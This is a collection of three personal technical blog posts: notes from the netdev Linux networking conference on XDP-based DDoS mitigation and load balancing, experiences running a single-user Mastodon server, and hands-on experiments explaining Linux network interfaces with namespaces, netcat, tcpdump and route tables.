{"url": "https://jvns.ca/blog/2017/04/06/netdev-2-1/", "title": "netdev conference, day 1", "content": "\n     \n\n Today I am at netdev, a conference about Linux networking. I promised my\ncoworkers notes so you all get notes too :) \n\n This is a different conference for me than usual – I think I’m learning more at\nthis conference than most conferences I’ve been at in the last\nfew years. A lot of it goes above my head (a lot of the presenters/attendees\nwork on networking subsystems in the Linux kernel), but I kind of like that! It means\nthere are a lot of new ideas and terminology. \n\n Here are some notes from today’s talks. They’re relatively\nstream-of-consciousness but if I’m going to have notes for this conference\nat all that’s how it’s gonna have to be. There are gonna be a bunch of mistakes\nin here. \n\n XDP in practice: integrating XDP in our DDoS mitigation pipeline \n\n by  Gilberto Bertin  from\nCloudflare. \n\n This talk was from Cloudflare! They’re a CDN, and one of the services they\nprovide is DDOS mitigation. So if you’re being DDOSed, they’ll figure out which\nnetwork traffic is an attack and absorb the malicious traffic themselves\ninstead of passing. \n\n how do you figure out whether traffic is malicious or not? \n\n To block malicious traffic, first you need to figure out that that it’s\nmalicious! When you’re doing DDOS mitigation manually (which is slow), you look\nfor a pattern that the malicious traffic matches, and then write code to block\ntraffic that matches that pattern. They’re doing the same thing, except\nautomatically \n\n They do this by \n\n \n sampling some small percentage of traffic at every edge server \n encoding that traffic with “sFlow” ( wikipedia article  and sending it by UDP to some central servers that do packet analysis \n The central servers come up with “patterns” that should be blocked \n for example, those central servers might notice that there are a ton of suspicious-looking packets that are all from the same IP address \n \n\n how do you block the malicious traffic? \n\n They compile their malicious-traffic-patterns into BPF rules. Cloudflare has\nsome software called  bpftools  that\nlets you take a pattern and compile it into code that the kernel can run to\nfilter packets. \n\n For example  ./bpfgen dns -- *.www.example.uk  will create a BPF filter for DNS\npackets matching  *.www.example.uk . \n\n Okay, so suppose you have BPF bytecode that matches the traffic that you want\nto block! How do you actually \n\n way 1 : iptables \n\n He said that they started out using IPtables to filter traffic. This made sense\nbecause iptables is the only way I know to filter traffic :) \n\n The problem with this was that there were “IRQ storms”. I’m not totally sure\nwhat this means, but I think that it means that in the Linux networking stack\nthere are a lot of interrupts, and interrupts at some point are kind of\nexpensive, using iptables to filter really high packet volumes eventually goes\nbadly. \n\n way 2  userspace offload \n\n Okay, so doing networking in the kernel is going slowly. Let’s do it in\nuserspace! He said they used  solarflare  which is\na proprietary userspace networking stack. (and they also sell hardware?) \n\n There were 2 problems with this but the one I understood was that “getting\npackets back into the kernel networking stack is expensive” \n\n way 3 : XDP \n\n this talk was about XDP so obviously they ended up using it. here are some\nlinks about XDP: \n\n \n a nice introduction on LWN:  Debating the value of XDP \n https://www.iovisor.org/technology/xdp \n https://prototype-kernel.readthedocs.io/en/latest/networking/XDP/introduction.html#what-is-xdp \n \n\n What I understand about XDP so far: there are a lot of steps in the Linux\nnetworking stack (see  Monitoring and Tuning the Linux Networking Stack: Receiving Data  ). \n\n If you want to filter out packets very quickly, you don’t want to go through\nall those steps! You want to just read packets off the network card, be like\n“NOPE not that one!”, and move on really quickly. \n\n It seems like XDP is a pretty new system (at the end of this talk, someone\ncommented “congratulations on using such new technology!), and they\nstarted using it at Cloudflare to do packet filtering. A few notes from this\nsection of the talk: \n\n \n “ebpftools generates XDP programs” \n XDP programs are C programs, which are compiled by clang, which then become\neBPF bytecode \n the eBPF uses maps (hashmaps? unclear) that are shared with userspace. I\ndidn’t catch what the userspace code that those maps are shared with does. \n Also, he mentioned a tool called  p0f ,\n wikipedia \nthat can do OS fingerprinting of network traffic. \n their BPF bytecode generation tool supports p0f signatures \n XDP requires at least a 4.8 kernel. They use 4.9 because they want to be\nusing an LTS release \n XDP doesn’t support all network cards \n \n\n There was some discussion at the end of this talk about how you can mark\npackets in XDP. I didn’t totally understand why you would want to mark packets,\nbut here are some things I learned. \n\n \n the fundamental data structure in the linux networking stack is the skb or\n socket buffer \n \n\n this was a really good talk and I learned a lot \n\n XDP at Facebook \n\n by Huapeng Zhou, Doug Porter, Ryan Tierney, Nikita Shirokov from Facebook\n(though only one of them spoke) \n\n This talk was about how Facebook uses XDP for 2 different things: \n\n \n to implement an L4 load balancer \n for DDOS mitigation \n \n\n He said they have an L4 load balancer (called “SHIV”?) which forwards traffic\nto downstream L7 load balancers. This is the frontend for Facebook, I think –\nlike the first servers your requests hit when you go to facebook.com. \n\n There’s another talk about load balancing at Facebook from SRECon a while back:\n Building A Billion User Load Balancer \n\n He said that before they were using something called “IPVS”. At work we use\nHAProxy to do load balancing. It seems like  IPVS  is a load balancer that is\ninside of the Linux kernel? I found this  blog post about IPVS which has more\ninformation . \n\n Anyway, so they stopped using IPVS for some reason and decided to use XDP\ninstead. At the end of this talk they said that XDP is 10x faster. \n\n This talk didn’t talk about how you configure the load balancer\n(how do you tell it which backends to use for which requests? does it do\nhealthchecks to figure out if some backend is temporarily down? Are the\nhealthchecks done in userspace? How do the results from the healthchecks get\nback into the XDP program running in the kernel?) \n\n The interesting thing in this talk is that they made some progress on debugging\nXDP programs: debugging XDP programs seems kind of hard (is that because they run on\nthe eBPF virtual machine? all this ebpf stuff is still a little unclear to me). \n\n eBPF seems to support putting events into perf events via\n bpf_perf_event_output , which is cool because  perf_events  is an existing\nframework. \n\n Linux Networking for the Enterprise \n\n by Shrijeet Mukherjee from Cumulus \n\n This talk seemed to be about what networking features enterprise customers care\nabout. I learned from this talk that people in the enterprise have a lot of\nethernet cables, and that ethtool is (or should be?) a good tool for figuring\nout if your ethernet cables are working. \n\n He also talked about how multicast is not that popular anymore, but a lot of\nenterprises care about multicast, so you need to have multicast support. \n\n lunch \n\n At lunch there was a vegetarian table which was a cool way to mix people who\nmight not otherwise sit together :) \n\n Everyone was really nice and let me ask a bunch of questions. Here are a few\nthings I learned at lunch: \n\n sharing a network card between the Linux kernel and userspace \n\n Usually on Linux people use the Linux kernel to do networking. But sometimes\nyou want to do networking in userspace! (for performance reasons, or\nsomething). I wanted to know if the Linux kernel can share access to the\nnetwork card with a userspace program. It turns out that it can! \n\n The person I was talking to mentioned that there are “many RX queues”. I took\nthat hint and Googled after lunch, and found  this great blog post from Cloudflare . \n\n So! It turns out that the first step in receiving a network packet is for the\nnetwork card to put data in an “RX ring” or “RX queue”, which is an area in\nmemory. two facts: \n\n \n there can be more than one of these queues \n you can program the network card to only put certain packets in certain\nqueues (“put all UDP packets from port 53 into queue 4”) \n different applications can use different queues \n \n\n So if you want Linux to share, you can have Linux handle most of the RX queues,\nbut make your userspace program handle one of them. That’s cool! \n\n more about tc \n\n I wrote the other day about how to  make your internet slow with tc .\nIt turns out that tc can do a lot more things than make your internet slow! \n\n For example! I used to share my internet connection with my cousin upstairs,\nand I run a Linux router. I could use  tc  to program my router to limit\ntraffic from my cousin’s computer (by filtering + ratelimiting traffic from her\nMAC Address or something). There’s more about how to do that on  OpenWRT’s site \n\n Another thing apparently tc can do is  hardware offload . Basically as far as\nI understand it – a lot of network cards have super fancy\nfeatures. They can do a lot of the packet processing that usually your kernel\nwould do (like checksums, and more).  tc  knows how to program your network\ncard to do fancy packet processing. \n\n There is a lot more but those were the two easiest things for me to understand. \n\n networking performance workshop \n\n chaired by Alex Duyck, I didn’t manage to take notes of all the speakers. \n\n This was a workshop about new developments in networking performance (by people\nfrom Intel, Mellanox, and somewhere else). \n\n My notes here are pretty sparse because I didn’t understand most of it, but\nthey were all around “how do you make networking faster?” \n\n Page based receive + page reuse \n\n The premise for here seemed to be \n\n \n the usual size of a page on Linux is 4kb \n the usual MTU for a packet (“maximum transmission unit”, or basically the\npacket size) is 1500 bytes \n making new pages is expensive (though I didn’t 100% understand this) \n but a page is more than twice as big as a packet, so somehow you can put two\npackets in one page \n and there are a bunch of complications \n \n\n Interesting thing: the speaker mentioned that in their network drivers, a lot\nof people use “memory barriers” that are too strong. But wait, what’s a memory\nbarrier? By Googling I found\n https://www.kernel.org/doc/Documentation/memory-barriers.txt  about memory\nbarriers people use in the Linux kernel which seems pretty readable. So that\ngoes on my to-read list :) \n\n I think he suggested using the  dma_rmb / dma_wmb  memory barriers instead of\n rmb / wmb . \n\n memory bottlenecks \n\n The second talk was about a pretty similar topic – the idea is that memory\nallocator performance is limiting how fast you can process packets with XDP. \n\n They said that if you use bigger pages (like 64k), then you don’t have to\nallocate as much memory (which is good), but the problem is that if you put\nmany packets/fragments into the same large page, then you have to wait for all\nthose fragments to be processed before you can free the page. So there’s a\ntradeoff there. \n\n AF_PACKETv4 \n\n Okay, this is a different thing! This thing is a work in progress and they\nhaven’t even written the code that would go in the kernel yet. The motivation\nfor this work as far as I understood it was to make tcpdump (and tools like\ntcpdump) run faster. \n\n I think the idea here is: \n\n \n when you use tcpdump, it reads raw packets from the network interface and\nparses them \n but it has to copy those packets into its memory (in userspace) and copying\ntakes time \n so it would be better if tcpdump could get the packets without having to copy\nthem \n \n\n I think the idea here is that you could open a socket in mode  AF_PACKET_v4 \nor something, and then you would get access to packets from a network interface\nwithout then being copied at all. \n\n I like tcpdump a lot so anything that could make tcpdump faster is something I\nam excited about! I would like to understand this better. \n\n When I was looking up stuff about this I found this cool blog post from\nMarek at Cloudflare about how tcpdump works:  BPF: the forgotten bytecode \n\n a talk from Oracle \n\n by Sowmini Varadhan, Tushar Dave \n\n I missed the first half of this talk so I can’t tell you\nwhat it was about but she said something interesting! \n\n She showed 4 graphs of latency vs throughput. In all the graphs: \n\n \n they started out flat (so you could do 10,000 reqs/s with 1000ms latency,\n50,000 reqs/s with 1000ms latency) \n at some point they hit a throughput “cliff” – like, the system just would\nnot process more than 100,000 reqs/s at all, and as you put more requests\ninto it the latency would just keep going up \n \n\n I know that there’s a tradeoff between latency and throughput for any system (if you want\n fast  replies, you have to send less requests), and it was nice to see graphs\nof that tradeoff. And it was interesting to see such an abrupt throughput cliff. \n\n evolution of network i/o virtualization \n\n by: Anjali Jain, Alexander Duyck, Parthasarathy Sarangam, Nrupal Jani \n\n This one was about the past/present/future of how network virtualization\nworks. By people from Intel. \n\n What I learned: \n\n \n SR-IOV is a way of doing network virtualization \n they spent most of their time talking about SR-IOV so it must be important?\nmaybe it’s something Intel invests in a lot? \n an “IOMMU” is an important thing \n in SR-IOV, you can only have 2^16 virtual machines at a time (16 bits) \n “east-west” is traffic between VMs on the same machines, and “north-south”\nis traffic between VMs on different boxes \n there are performance problems with VMs on the same host talking (“east-west\ntraffic”). this is because “it’s bottlenecked by the PCI bus”. what is the\nPCI bus though and why does it cause bottlenecks? \n \n\n They spent a long time in this talk talking about live migration of VMs here and how it\ninteracts with network virtualization. Live migration means that you take a\nvirtual machine and move it to another computer while it’s running. I thought\nit was interesting that they talked about it like it’s a normal thing because I\nthink of it as like.. something totally magical that doesn’t exist in real\nlife. \n\n But I guess if you’re building the networking hardware we’re going to be using\n5-10 years in the future, you need to be thinking ahead! \n\n that’s all for today \n\n more tomorrow, hopefully. \n\n"},
{"url": "https://jvns.ca/blog/2023/08/11/some-notes-on-mastodon/", "title": "Notes on using a single-person Mastodon server", "content": "\n     \n\n I started using Mastodon back in November, and it’s the Twitter alternative\nwhere I’ve been spending most of my time recently, mostly because the Fediverse\nis where a lot of the Linux nerds seem to be right now. \n\n I’ve found Mastodon quite a bit more confusing than Twitter because it’s a\ndistributed system, so here are a few technical things I’ve learned about it\nover the last 10 months. I’ll mostly talk about what using a single-person\nserver has been like for me, as well as a couple of notes about the API, DMs\nand ActivityPub. \n\n I might have made some mistakes, please let me know if I’ve gotten anything\nwrong! \n\n what’s a mastodon instance? \n\n First: Mastodon is a decentralized collection of independently run servers\ninstead of One Big Server. The software is  open source . \n\n In general, if you have an account on one server (like  ruby.social ), you\n can  follow people on another server (like  hachyderm.io ), and they can\nfollow you. \n\n I’m going to use the terms “Mastodon server” and “Mastodon instance”\ninterchangeably in this post. \n\n on choosing a Mastodon instance \n\n These were the things I was concerned about when choosing an instance: \n\n \n An instance name that I was comfortable being part of my online\nidentity. For example, I probably wouldn’t want to be\n @b0rk@infosec.exchange  because I’m not an infosec person. \n The server’s stability. Most servers are volunteer-run, and volunteer\nmoderation work can be exhausting – will the server really be around in a few\nyears? For example  mastodon.technology   and mastodon.lol shut down. \n The admins’ moderation policies. \n That server’s general reputation with other servers. I started out on\n mastodon.social , but some servers choose to block or limit mastodon.social\nfor various reasons \n The community: every Mastodon instance has a local timeline with all posts\nfrom users on that instance, would I be interested in reading the local\ntimeline? \n Whether my account would be a burden for the admin of that server (since I have a lot of followers) \n \n\n In the end, I chose to run my own mastodon server because it seemed simplest –\nI could pick a domain I liked, and I knew I’d definitely agree with the\nmoderation decisions because I’d be in charge. \n\n I’m not going to give server recommendations here, but here’s a list of the  top 200 most common servers people who follow me use . \n\n using your own domain \n\n One big thing I wondered was – can I use my own domain (and have the username  @b0rk@jvns.ca  or something) but be on someone else’s Mastodon server? \n\n The answer to this seems to be basically “no”: if you want to use your own\ndomain on Mastodon, you need to run your own server. (you can  kind of do this ,\nbut it’s more like an alias or redirect – if I used that method to direct  b0rk@jvns.ca  to  b0rk@mastodon.social , my\nposts would still show up as being from  b0rk@mastodon.social ) \n\n There’s also other\nActivityPub software ( Takahē ) that supports people\nbringing their own domain in a first-class way. \n\n notes on having my own server \n\n I really wanted to have a way to use my own domain name for identity, but to\nshare server hosting costs with other people. This isn’t possible on Mastodon\nright now, so I decided to set up my own server instead. \n\n I chose to run a Mastodon server (instead of some other ActivityPub\nimplementation) because Mastodon is the most popular one. Good managed\nMastodon hosting is readily available, there are tons of options for client\napps, and I know for sure that my server will work well with other people’s\nservers. \n\n I use  masto.host  for Mastodon hosting, and it’s been great so\nfar. I have nothing interesting to say about what it’s like to operate a\nMastodon instance because I know literally nothing about it. Masto.host handles\nall of the server administration and Mastodon updates, and I never think about\nit at all. \n\n Right now I’m on their $19/month (“Star”) plan, but it’s possible I could use a\nsmaller plan with no problems. Right now their cheapest plan is $6/month and I\nexpect that would be fine for someone with a smaller account. \n\n Some things I was worried about when embarking on my own Mastodon server: \n\n \n I wanted to run the server at  social.jvns.ca , but I wanted my username to\nbe  b0rk@jvns.ca  instead of  b0rk@social.jvns.ca . To get this to work I\nfollowed these  Setting up a personal fediverse ID  directions from\nJacob Kaplan-Moss and it’s been fine. \n The administration burden of running my own server. I imported a small list\nof servers to block/defederate from but didn’t do anything else. That’s been\nfine. \n Reply and profile visibility. This has been annoying and we’ll talk about it next \n \n\n downsides to being on a single-person server \n\n Being on a 1-person server has some significant downsides. To understand\nwhy, you need to understand a little about how Mastodon works. \n\n Every Mastodon server has a database of posts. Servers only have posts that\nthey were explicitly sent by another server in their database. \n\n Some reasons that servers might receive posts: \n\n \n someone on the server follows a user \n a post mentions someone on the server \n \n\n As a 1-person server, my server does not receive that many posts! I only get\nposts from people I follow or posts that explicitly mention me in some way. \n\n The causes several problems: \n\n \n when I visit someone’s profile on Mastodon who I don’t already follow, my\nserver will not fetch the profile’s content (it’ll fetch their profile\npicture, description, and pinned posts, but not any of their post history).\nSo their profile appears as if they’ve never posted anything \n bad reply visibility: when I look at the replies to somebody else’s post\n(even if I follow them!), I don’t see all of the replies, only the ones\nwhich have made it to my server. If you want to understand the exact rules\nabout who can see which replies (which are quite complicated!),  here’s a great deep dive  by Sebastian Jambor.\nI think it’s possible to end up in a state where no one person can see all\nof the replies, including the original poster. \n favourite and boost accounts are inaccurate – usually posts show up having\nat most 1 or 2 favourites / boosts, even if the post was actually favourite\nor boosted hundreds of times. I think this is because it only counts\nfavourites/boosts from people I follow. \n \n\n All of these things will happen to users of any small Mastodon server, not just\n1-person servers. \n\n bad reply visibility makes conversations harder \n\n A lot of people are on smaller servers, so when they’re participating in a\nconversation, they can’t see all the replies to the post. \n\n This means that replies can get pretty repetitive because people literally\ncannot see each other’s replies. This is especially annoying for posts that are\npopular or controversial, because the person who made the post has to keep\nreading similar replies over and over again by people who think they’re making\nthe point for the first time. \n\n To get around this (as a reader), you can click “open link to post” or something in your\nMastodon client, which will open up the page on the poster’s server where you\ncan read all of the replies. It’s pretty annoying though. \n\n As a poster, I’ve tried to reduce repetitiveness in replies by: \n\n \n putting requests in my posts like “(no need to reply if you don’t remember, or if you’ve been using the command line comfortably for 15 years — this question isn’t for you :) )” \n occasionally editing my posts to include very common replies \n very occasionally deleting the post if it gets too out of hand \n \n\n The Mastodon devs are extremely aware of these issues, there are a bunch of github issues about them: \n\n \n backfill statuses when first subscribed \n fetch whole conversation threads \n \n\n My guess is that there are technical reasons these features are difficult to\nadd because those issues have been open for 5-7 years. \n\n The Mastodon devs have said that they plan to improve reply fetching, but that\nit requires a significant amount of work. \n\n some visibility workarounds \n\n Some people have built workarounds for fetching profiles / replies. \n\n \n Fedifetcher \n combine.social \n \n\n Also, there are a couple of Mastodon clients which will proactively fetch replies. For iOS: \n\n \n Mammoth does it automatically \n Mona will fetch posts if I click “load from remote server” manually \n \n\n I haven’t tried those yet though. \n\n other downsides of running your own server: discovery is much harder \n\n Mastodon instances have a “local timeline” where you can see everything other\npeople on the server are posting, and a “federated timeline” which shows sort\nof a combined feed from everyone followed by anyone on the server. This means\nthat you can see trending posts and get an idea of what’s going on and find\npeople to follow. You don’t get that if you’re on a 1-person\nserver – it’s just me talking to myself! (plus occasional interjections from\n my reruns bot ). \n\n Some workarounds people mentioned for this: \n\n \n you can populate your federated timeline with posts from another instance by\nusing a  relay . I haven’t done this but someone else said they use\n FediBuzz  and I might try it out. \n some mastodon clients (like apparently Moshidon on Android) let you follow other instances \n \n\n If anyone else on small servers has suggestions for how to make discovery\neasier I’d love to hear them. \n\n account migration \n\n When I moved to my own server from  mastodon.social , I needed to run an account migration to move over my followers. First, here’s how migration works: \n\n \n Account migration  does not  move over your posts. All of my posts stayed\non my old account. This is part of why I moved to running my own server\n– I didn’t want to ever lose my posts a second time. \n Account migration  does not  move over the list of people you\nfollow/mute/block. But you can import/export that list in your Mastodon\nsettings so it’s not a big deal. If you follow private accounts they’ll have\nto re-approve your follow request. \n Account migration  does  move over your followers \n \n\n The follower move was the part I was most worried about. Here’s how it turned out: \n\n \n over ~24 hours, most of my followers moved to the new account \n one or two servers did not get the message about the account migration for\nsome reason, so about 2000 followers were “stuck” and didn’t migrate. I\nfixed this by waiting 30 days and re-running the account migration, which\nmoved over most of the remaining followers. There’s also a  tootctl command  that the admin of\nthe  old instance  can run to retry the migration \n about 200 of my followers never migrated over, I think because they’re using\nActivityPub software other than Mastodon which doesn’t support account\nmigration. You can see the  old account here \n \n\n using the Mastodon API is great \n\n One thing I love about Mastodon is – it has an API that’s MUCH easier to use\nthan Twitter’s API. I’ve always been frustrated with how difficult it is to\nnavigate large Twitter threads, so I made a small  mastodon thread view  website that lets you log into\nyour Mastodon account. It’s pretty janky and it’s really only made for me to\nuse, but I’ve really appreciated the ability to write my own janky software to\nimprove my Mastodon experience. \n\n Some notes on the Mastodon API: \n\n \n You can build Mastodon client software totally on the frontend in Javascript, which is really cool. \n I couldn’t find a vanilla Javascript Mastodon client, so I  wrote a crappy one \n API docs are here \n Here’s a  tiny Python script I used to list all my Mastodon followers ,\nwhich also serves as a simple example of how easy using the API is. \n The best documentation I could find for which OAuth scopes correspond to which API endpoints is  this github issue \n \n\n Next I’ll talk about a few general things about Mastodon that confused or\nsurprised me that aren’t specific to being on a single-person instance. \n\n DMs are weird \n\n The way Mastodon DMs work surprised me in a few ways: \n\n \n Technically DMs are just regular posts with visibility limited to the\npeople mentioned in the post. This means that if you accidentally mention\nsomeone in a DM (“@x is such a jerk”), it’s possible to accidentally send the\nmessage to them \n DMs aren’t very private: the admins on the sending and receiving servers can\ntechnically read your DMs if they have access to the database. So they’re not\nappropriate for sensitive information. \n Turning off DMs is weird. Personally I don’t like receiving DMs from\nstrangers – it’s too much to keep track of and I’d prefer that people email\nme. On Twitter, I can just turn it off and people won’t see an option to DM\nme. But on Mastodon, when I turn off notifications for DMs, anyone can still\n“DM” me, but the message will go into a black hole and I’ll never see it. I\nput a note in my profile about this. \n \n\n defederation and limiting \n\n There are a couple of different ways for a server to block another Mastodon\nserver. I haven’t really had to do this much but people talk about it a lot and I was confused about the difference, so: \n\n \n A server can  defederate  from another server (this seems to be called  suspend  in the Mastodon docs). This means that nobody on a server can follow someone from the other server. \n A server can  limit  (also known as “silence”) a user or server. This means that content from that user is only visible to\nthat user’s followers – people can’t discover the user through retweets (aka “boosts” on Mastodon). \n \n\n One thing that wasn’t obvious to me is that who servers defederate / limit is\nsometimes hidden, so it’s hard to suss out what’s going on if you’re\nconsidering joining a server, or trying to understand why you can’t see certain\nposts. \n\n there’s no search for posts \n\n There’s no way to search past posts you’ve read. If I see something interesting\non my timeline and want to find it later, I usually can’t. (Mastodon has a\n Elasticsearch-based search feature , but it only allows you to search your own posts, your mentions, your\nfavourites, and your bookmarks) \n\n These limitations on search are intentional (and a very common source of arguments) – it’s a privacy / safety issue.\nHere’s a  summary from Tim Bray \nwith lots of links. \n\n It would be personally convenient for me to be able to search more easily but I respect folks’ safety concerns so I’ll leave it at that. \n\n My understanding is that the Mastodon devs are planning to add opt-in search\nfor public posts relatively soon. \n\n other ActivityPub software \n\n We’ve been talking about Mastodon a lot, but not everyone who I follow is using\nMastodon: Mastodon uses a protocol called  ActivityPub  to distribute messages. \n\n Here are some examples of other software I see people talking about, in no particular order: \n\n \n Calckey \n Akkoma \n gotosocial \n Takahē \n writefreely \n pixelfed  (for images) \n \n\n I’m probably missing a bunch of important ones. \n\n what’s the difference between Mastodon and other ActivityPub software? \n\n This confused me for a while, and I’m still not super clear on how ActivityPub works. What I’ve understood is: \n\n \n ActivityPub is a protocol (you can explore how it works with blinry’s nice  JSON explorer ) \n Mastodon  servers  communicate with each other (and with other ActivityPub servers) using ActivityPub \n Mastodon  clients  communicate with their server using the Mastodon API, which is its own thing \n There’s also software like  GoToSocial  that aims to be compatible with the Mastodon API, so that you can use a Mastodon client with it \n \n\n more mastodon resources \n\n \n Fedi.Tips  seems to be a great introduction \n I think you can still use  FediFinder  to find folks you followed on Twitter on Mastodon \n I’ve been using the  Ivory  client on iOS, but\nthere are lots of great clients.  Elk  is an alternative\nweb client that folks seem to like. \n \n\n I haven’t written here about what Mastodon culture is like because other people\nhave done a much better job of talking about it than me, but of course it’s is\nthe biggest thing that affects your experience and it was the thing that took\nme longest to get a handle on. A few links: \n\n \n Erin Kissane on  frictions people run into when joining Mastodon \n Kyle Kingsbury wrote some great  moderation guidelines for woof.group  (note: woof.group is a LGBTQ+ leather instance, be prepared to see lots of NSFW posts if you visit it) \n Mekka Okereke writes  lots of great posts about issues Black people encounter on Mastodon  (though they’re all on Mastodon so it’s a little hard to navigate) \n \n\n that’s all! \n\n I don’t regret setting up a single-user server – even though it’s\ninconvenient, it’s important to me to have control over my social media. I\nthink “have control over my social media” is more important to me than it is to\nmost other people though, because I use Twitter/Mastodon a lot for work. \n\n I am happy that I didn’t  start out  on a single-user server though –  I think\nit would have made getting started on Mastodon a lot more difficult. \n\n Mastodon is pretty rough around the edges sometimes but I’m able to have more\ninteresting conversations about computers there than I am on Twitter (or\nBluesky), so that’s where I’m staying for now. \n\n"},
{"url": "https://jvns.ca/blog/2017/09/03/network-interfaces/", "title": "What's a network interface?", "content": "\n     \n\n I’ve been working with container networking a bunch this week. When learning\nabout new unfamiliar stuff (like container networking / virtual ethernet\ndevices / bridges / iptables), I often realize that I don’t fully understand\nsomething much more fundamental. \n\n This week, that thing was: network interfaces!! \n\n You know, when you run  ifconfig  and it lists devices like  lo ,  eth0 ,\n br0 ,  docker0 ,  wlan0 , or whatever. Those. \n\n This is a thing I  thought  I understood but it turns out there are at least\n2 things I didn’t know about them. \n\n I’m not going to try to give you a crisp definition, instead we’re going to\nmake some observations, do some experiments, ask some questions, and make some\nguesses. \n\n What happens if you don’t have any network interfaces? \n\n I was messing around with network namespaces, and I created a new one with: \n\n sudo ip netns add ns1 \n\n It turns out that when you create a new network namespace, it doesn’t have any\nnetwork interfaces at all! What does that mean?  Let’s explore and see what it\nlooks like: \n\n We can run commands inside this new network namespace with  sudo ip netns exec ns1 COMMAND . I’m just going to run a shell inside this network namespace, and then\ntry out some things. \n\n So let’s start with  sudo ip netns exec ns1 bash \n\n $ sudo ip netns exec ns1 bash\n$ ifconfig\n(no output)\n \n\n That makes sense, this is a new network namespace so there are no network\ninterfaces set up yet. Still inside that network namespace, let’s try to make a\nwebserver and connect to it. \n\n $ nc -l 8900 & # make a server on port 8900\n$ netstat -tulpn # list open ports\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address   PID/Program name\ntcp        0      0 0.0.0.0:8900    2918/nc \n$ curl localhost:8900\ncurl: (7) Couldn't connect to server\n \n\n Okay, so this is sort of interesting. I can create a server on port 8900 with\n nc -l 8900 . And netstat shows that that server exists. But when I try to\n curl localhost:8900 , nothing happens! \n\n What if I try to create a server listening on 127.0.0.1? \n\n sudo nc -l 127.0.0.1 8080\nnc: Cannot assign requested address\n \n\n Doesn’t work. Makes sense. \n\n I think what’s happening here is: \n\n \n nc -l 8900  is listening on 0.0.0.0:8900, which means “all network interfaces” \n but there are no network interfaces \n so when we do  curl localhost:8900 , no packets actually get sent (when I ran tcpdump, no packets show up) \n so  nc  never receives any packets \n \n\n Let’s do an experiment to try to confirm our hypotheses: let’s add a network\ninterface! The idea is that if we have a  lo  network interface, then  curl\nlocalhost:8900  will actually send packets,  nc  will receive them, and\neverything will work. \n\n $ ip link set dev lo up # this sets uo the 'lo' loopback interface\n$ curl localhost:8900                                                                               \n# BAM! this totally works! \n# the backgrounded netcat prints out this output:\nGET / HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: localhost:8900\nAccept: */*\n \n\n This is rad. What we know now: \n\n \n if you don’t have any network interfaces, you can’t do any networking (but you can start servers on 0.0.0.0 and netstat shows those servers) \n when we add a network interface, our server starts working right away (without having to restart the server) \n \n\n A packet can appear multiple times in tcpdump \n\n Something I’ve been observing recently but haven’t fully understood is – sometimes I’ll be on a machine which has \n\n \n virtual network interfaces for each container ( vethXXXXXXX ) \n a bridge interface ( cni0 ) \n and a “real” network interface to the outside world ( eth0 ) \n \n\n When containers send packets to the outside world and I’m running  sudo tcpdump -i any , I’ll see those packets  3 times . \n\n I know a few more things about how tcpdump works: \n\n \n I can run  sudo tcpdump -i cni0  to listen on a specific interface. When I do that, the packets appear only once \n tcpdump happens at the “beginning” of the network stack. I think that means that packets are captured by tcpdump when packets enter a network interface \n \n\n What does “enter a network interface” actually mean, though? I tried to look at\n this 20,000 word article on the linux network stack \nand I think I have a workable theory! \n\n What happens when a packet is created? \n\n Okay, so I skimmed  Monitoring and Tuning the Linux Networking Stack: Receiving Data  and I think I have a working hypothesis for how packets \n\n \n get assigned network interfaces \n get captured by tcpdump \n can be assigned more than one network interface \n \n\n First thing first, this document refers to “network interfaces” as “network devices”. I think those are the same thing. \n\n So!! Let’s say I create a packet on my computer. \n\n step 0 : iptables prerouting rules \n\n step 1 : the packet gets  routed . \n\n Routing a packet means “assigning it a network device”. \n\n Let’s do a tiny experiment in routing – I have 3 interfaces on my computer right now \n\n $ ifconfig\ndocker0   Link encap:Ethernet  HWaddr 02:42:ef:ab:0d:ac  \n          inet addr:172.17.0.1  Bcast:0.0.0.0  Mask:255.255.0.0\n\nenp0s25   Link encap:Ethernet  HWaddr 3c:97:0e:55:b3:7g  \n          inet addr:192.168.1.213  Bcast:192.168.1.255  Mask:255.255.255.0\n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n \n\n and here are the routes: \n\n $ sudo ip route list table all\ndefault via 192.168.1.1 dev enp0s25  proto static  metric 100 \n169.254.0.0/16 dev docker0  scope link  metric 1000 linkdown \n172.17.0.0/16 dev docker0  proto kernel  scope link  src 172.17.0.1 linkdown \n192.168.1.0/24 dev enp0s25  proto kernel  scope link  src 192.168.1.213  metric 100 \nlocal 127.0.0.0/8 dev lo  table local  proto kernel  scope host  src 127.0.0.1 \nlocal 127.0.0.1 dev lo  table local  proto kernel  scope host  src 127.0.0.1 \nlocal 172.17.0.1 dev docker0  table local  proto kernel  scope host  src 172.17.0.1 \n \n\n So – if I make a request to 172.17.0.1 ( curl 172.17.0.1:8080 ), it seems like that would end up on the\n docker0  device. Right? Wrong, apparently. \n\n If I run  tcpdump -i lo  packets to 172.17.0.1 show up, and if I run  tcpdump -i docker0 ,\nthe packets don’t show up. So it seems right now, on my machine,\npackets sent to 172.17.0.1 go through the  lo  device. \n\n The reason they get sent to  lo  instead of  docker0  is that there’s a route\nfor 172.17.0.1  in my route table that says  local  – the same reasons that\npackets to  127.0.0.1  get sent to  lo . \n\n step 2  tcpdump gets the packet \n\n This is pretty straightforward – once there’s a network device attached to the\npacket, then tcpdump gets the packet. \n\n That’s all I know for now! \n\n ok so what do we know about network interfaces? \n\n Here’s what I think so far: \n\n \n they can be physical network interfaces (like  eth0 ) or virtual interfaces (like  lo  and  docker0 ) \n you can list them with  ifconfig  or  ip link list \n if you don’t have any network interfaces, your packets don’t enter the linux network stack at all really. To go through the network stack you need network interfaces. \n When you send a packet to an IP address, your  route table  decides which network interface that packet goes through. This is one of the first things that happens in the network stack. \n tcpdump captures packets after they’re routed  (assigned an interface) Though there’s a  PREROUTING  chain in iptables that happens before routing!` \n \n\n Some of this is probably wrong, let me know what! I’m on Twitter as always ( https://twitter.com/b0rk ) \n\n"},
